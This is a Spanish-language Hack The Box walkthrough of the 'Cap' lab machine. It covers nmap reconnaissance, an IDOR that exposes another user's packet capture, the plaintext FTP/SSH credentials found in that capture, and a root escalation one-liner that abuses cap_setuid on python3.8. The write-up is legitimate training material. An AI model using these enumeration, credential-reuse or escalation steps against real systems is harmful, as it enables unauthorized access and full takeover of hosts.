---
title: Cap
description: Cap es una máquina Linux de dificultad fácil que ejecuta un servidor HTTP encargado de funciones administrativas, como capturas de red. Un control inadecuado provoca una Referencia Directa de Objetos Insegura (IDOR), permitiendo el acceso a la captura de otro usuario. La captura contiene credenciales en texto plano que pueden usarse para obtener acceso inicial. Luego, se utiliza una capability de Linux para escalar los privilegios a root.
date: 2024-08-03
toc: true
pin: false
image:
 path: /assets/img/htb-writeup-cap/cap_logo.png
categories:
  - Hack_The_Box
  - Machines
tags:
  - linux
  - hack_the_box
  - ftp
  - ssh
  - http
  - data_leaks
  - idor
  - capabilities
  - tcp
  - information_gathering
  - web_analysis
  - data_leak_exploitation
  - privilege_escalation

---
## Information Gathering

```terminal
/home/kali/Documents/htb/machines/cap:-$ ping -c 1 10.10.10.245
PING 10.10.10.245 (10.10.10.245) 56(84) bytes of data.
64 bytes from 10.10.10.245: icmp_seq=1 ttl=63 time=307 ms

--- 10.10.10.245 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 307.019/307.019/307.019/0.000 ms
```
```terminal
/home/kali/Documents/htb/machines/cap:-$ sudo nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.10.10.245 -oG nmap1
Host: 10.10.10.245 ()   Status: Up
Host: 10.10.10.245 ()   Ports: 21/open/tcp//ftp///, 22/open/tcp//ssh///, 80/open/tcp//http///
```
```terminal
/home/kali/Documents/htb/machines/cap:-$ sudo nmap -sCV -p21,22,80 -vvv 10.10.10.245 -oN nmap2
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2vrva1a+HtV5SnbxxtZSs+D8/EXPL2wiqOUG2ngq9zaPlF6cuLX3P2QYvGfh5bcAIVjIqNUmmc1eSHVxtbmNEQjyJdjZOP4i2IfX/RZUA18dWTfEWlNaoVDGBsc8zunvFk3nkyaynnXmlH7n3BLb1nRNyxtouW+q7VzhA6YK3ziOD6tXT7MMnDU7CfG1PfMqdU297OVP35BODg1gZawthjxMi5i5R1g3nyODudFoWaHu9GZ3D/dSQbMAxsly98L1Wr6YJ6M6xfqDurgOAl9i6TZ4zx93c/h1MO+mKH7EobPR/ZWrFGLeVFZbB6jYEflCty8W8Dwr7HOdF1gULr+Mj+BcykLlzPoEhD7YqjRBm8SHdicPP1huq+/3tN7Q/IOf68NNJDdeq6QuGKh1CKqloT/+QZzZcJRubxULUg8YLGsYUHd1umySv4cHHEXRl7vcZJst78eBqnYUtN3MweQr4ga1kQP4YZK5qUQCTPPmrKMa9NPh1sjHSdS8IwiH12V0=
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDqG/RCH23t5Pr9sw6dCqvySMHEjxwCfMzBDypoNIMIa8iKYAe84s/X7vDbA9T/vtGDYzS+fw8I5MAGpX8deeKI=
|   256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPbLTiQl+6W0EOi8vS+sByUiZdBsuz0v/7zITtSuaTFH
80/tcp open  http    syn-ack ttl 63 gunicorn
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     Server: gunicorn
|     Date: Tue, 03 Sep 2024 15:39:01 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Tue, 03 Sep 2024 15:38:50 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 19386
|     <!DOCTYPE html>
|     <html class="no-js" lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Security Dashboard</title>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <link rel="shortcut icon" type="image/png" href="/static/images/icon/favicon.ico">
|     <link rel="stylesheet" href="/static/css/bootstrap.min.css">
|     <link rel="stylesheet" href="/static/css/font-awesome.min.css">
|     <link rel="stylesheet" href="/static/css/themify-icons.css">
|     <link rel="stylesheet" href="/static/css/metisMenu.css">
|     <link rel="stylesheet" href="/static/css/owl.carousel.min.css">
|     <link rel="stylesheet" href="/static/css/slicknav.min.css">
|     !-- amchar
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Tue, 03 Sep 2024 15:38:52 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Allow: OPTIONS, HEAD, GET
|     Content-Length: 0
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Content-Type: text/html
|     Content-Length: 196
|     <html>
|     <head>
|     <title>Bad Request</title>
|     </head>
|     <body>
|     <h1><p>Bad Request</p></h1>
|     Invalid HTTP Version &#x27;Invalid HTTP Version: &#x27;RTSP/1.0&#x27;&#x27;
|     </body>
|_    </html>
|_http-server-header: gunicorn
|_http-title: Security Dashboard
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.94SVN%I=7%D=9/3%Time=66D72D8A%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,1554,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x
SF:20Tue,\x2003\x20Sep\x202024\x2015:38:50\x20GMT\r\nConnection:\x20close\
SF:r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x201
SF:9386\r\n\r\n<!DOCTYPE\x20html>\n<html\x20class=\"no-js\"\x20lang=\"en\"
SF:>\n\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\
SF:x20<meta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\x2
SF:0\x20\x20\x20<title>Security\x20Dashboard</title>\n\x20\x20\x20\x20<met
SF:a\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-scal
SF:e=1\">\n\x20\x20\x20\x20<link\x20rel=\"shortcut\x20icon\"\x20type=\"ima
SF:ge/png\"\x20href=\"/static/images/icon/favicon\.ico\">\n\x20\x20\x20\x2
SF:0<link\x20rel=\"stylesheet\"\x20href=\"/static/css/bootstrap\.min\.css\
SF:">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/f
SF:ont-awesome\.min\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x
SF:20href=\"/static/css/themify-icons\.css\">\n\x20\x20\x20\x20<link\x20re
SF:l=\"stylesheet\"\x20href=\"/static/css/metisMenu\.css\">\n\x20\x20\x20\
SF:x20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/owl\.carousel\.min
SF:\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static
SF:/css/slicknav\.min\.css\">\n\x20\x20\x20\x20<!--\x20amchar")%r(HTTPOpti
SF:ons,B3,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Tue,\
SF:x2003\x20Sep\x202024\x2015:38:52\x20GMT\r\nConnection:\x20close\r\nCont
SF:ent-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20OPTIONS,\x20HEAD,
SF:\x20GET\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,121,"HTTP/1\.1\
SF:x20400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type:\x20te
SF:xt/html\r\nContent-Length:\x20196\r\n\r\n<html>\n\x20\x20<head>\n\x20\x
SF:20\x20\x20<title>Bad\x20Request</title>\n\x20\x20</head>\n\x20\x20<body
SF:>\n\x20\x20\x20\x20<h1><p>Bad\x20Request</p></h1>\n\x20\x20\x20\x20Inva
SF:lid\x20HTTP\x20Version\x20&#x27;Invalid\x20HTTP\x20Version:\x20&#x27;RT
SF:SP/1\.0&#x27;&#x27;\n\x20\x20</body>\n</html>\n")%r(FourOhFourRequest,1
SF:89,"HTTP/1\.0\x20404\x20NOT\x20FOUND\r\nServer:\x20gunicorn\r\nDate:\x2
SF:0Tue,\x2003\x20Sep\x202024\x2015:39:01\x20GMT\r\nConnection:\x20close\r
SF:\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2023
SF:2\r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x203\.2\x
SF:20Final//EN\">\n<title>404\x20Not\x20Found</title>\n<h1>Not\x20Found</h
SF:1>\n<p>The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20s
SF:erver\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x20
SF:check\x20your\x20spelling\x20and\x20try\x20again\.</p>\n");
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

```terminal
/home/kali/Documents/htb/machines/cap:-$ whatweb 10.10.10.245
http://10.10.10.245 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[gunicorn], IP[10.10.10.245], JQuery[2.2.4], Modernizr[2.8.3.min], Script, Title[Security Dashboard], X-UA-Compatible[ie=edge]
```
---
## Web Analysis & Data Leak Exploitation

![](/assets/img/htb-writeup-cap/cap1.png)

En la pestaña 'Security Snapshot',  tengo la opción de descargar archivos con extensión .pcap.

Al realizar fuzzing en la URL '10.10.10.245/data/15', logro acceder a otros archivos .pcap.

![](/assets/img/htb-writeup-cap/cap2.png)

Utilizo Wireshark para analizar los archivos, y en 0.pcap descubro credenciales FTP, nathan:Buck3tH4TF0RM3!.

![](/assets/img/htb-writeup-cap/cap3.png)

![](/assets/img/htb-writeup-cap/cap4.png)

Las credenciales tambien son validas para SSH.

```terminal
/home/kali/Documents/htb/machines/cap:-$ ssh nathan@10.10.10.245
nathan@10.10.10.245's password: Buck3tH4TF0RM3!

nathan@cap:~$ cat user.txt
```
---
## Privilege Escalation

```terminal
nathan@cap:~$ cat /etc/passwd | grep /bash$
root:x:0:0:root:/root:/bin/bash
nathan:x:1001:1001::/home/nathan:/bin/bash
```

Busco capabilities y encuentro un binario utilizando la capacidad 'cap_setuid'.

```terminal
nathan@cap:~$ getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```
Python 3.8 tiene dos capacidades

'cap_setuid' permite cambiar el UID del proceso, lo que puede ser usado para escalar privilegios.

<https://gtfobins.github.io/gtfobins/python/#capabilities>

```terminal
nathan@cap:~$ id
uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)

nathan@cap:~$ python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'

~# id
uid=0(root) gid=1001(nathan) groups=1001(nathan)

~# cat /root/root.txt
```

> <a href="https://www.hackthebox.com/achievement/machine/1521382/351" target="_blank">Cap Machine from Hack The Box has been Pwned</a>
{: .prompt-tip }